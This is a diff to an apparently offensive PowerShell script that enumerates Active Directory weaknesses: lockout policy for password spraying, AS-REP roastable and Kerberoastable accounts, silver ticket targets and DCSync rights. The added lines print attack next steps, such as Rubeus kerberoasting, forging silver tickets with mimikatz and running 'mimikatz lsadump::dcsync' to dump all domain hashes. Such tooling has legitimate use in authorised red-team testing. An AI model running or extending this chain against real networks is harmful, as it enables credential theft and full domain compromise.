@@ -1,6 +1,7 @@
 function Test-PasswordSprayable {
     Write-Host "`n[+] Checking Lockout Policy (for password spraying feasibility)..." -ForegroundColor Yellow
     net accounts
+    Write-Host "`n[>] NEXT: If lockout threshold allows 3-5 attempts, perform slow password spray using valid usernames." -ForegroundColor DarkGray
 }
 
 function Find-ASREPRoastableUsers {
@@ -14,6 +15,7 @@ function Find-ASREPRoastableUsers {
         $sam = $u.Properties["samaccountname"]
         Write-Host "[AS-REP] User: $sam" -ForegroundColor Cyan
     }
+Write-Host "`n[>] NEXT: Use 'Rubeus asreproast' or 'GetNPUsers.py' on the discovered accounts to collect AS-REP hashes." -ForegroundColor DarkGray
 }
 
 function Find-KerberoastableUsers {
@@ -30,6 +32,7 @@ function Find-KerberoastableUsers {
             Write-Host "[SPN] $user → $spn" -ForegroundColor Cyan
         }
     }
+Write-Host "`n[>] NEXT: Use 'Rubeus kerberoast' or 'GetUserSPNs.py' to request TGS tickets and extract hashes for cracking." -ForegroundColor DarkGray
 }
 
 function Check-SilverTicketTargets {
@@ -38,6 +41,8 @@ function Check-SilverTicketTargets {
     # Reuse SPN enumeration above
     Find-KerberoastableUsers
     Write-Host "[*] Next step would be to extract NTLM hash from SAM or LSASS or dump service account creds to forge." -ForegroundColor DarkGray
+    Write-Host "`n[>] NEXT: If NTLM hash of service account is obtained, forge a Silver Ticket using mimikatz or kekeo." -ForegroundColor DarkGray
+
 }
 
 function Check-DCSyncPermissions {
@@ -56,6 +61,7 @@ function Check-DCSyncPermissions {
         $result = $searcher.FindOne()
         if ($result) {
             Write-Host "[*] Domain is accessible. Next, use advanced tools (e.g., PowerView or SharpHound) to check for Replication rights (DS-Replication-Get-Changes etc.)" -ForegroundColor Cyan
+            Write-Host "`n[>] NEXT: If your user or a group you're in has both rights, run 'mimikatz lsadump::dcsync' to dump all AD hashes." -ForegroundColor DarkGray
         } else {
             Write-Host "[!] Could not access domain object." -ForegroundColor Red
         }
@@ -90,6 +96,7 @@ function Find-DCSyncPrincipals {
         }
 
         Write-Host "`n[*] NOTE: DCSync requires both 'Get-Changes' AND 'Get-Changes-All'" -ForegroundColor DarkGray
+        Write-Host "`n[>] NEXT: Use PowerView’s 'Get-ObjectAcl' or BloodHound to enumerate DS-Replication rights in more detail." -ForegroundColor DarkGray
     } catch {
         Write-Host "[!] Error: $_" -ForegroundColor Red
     }
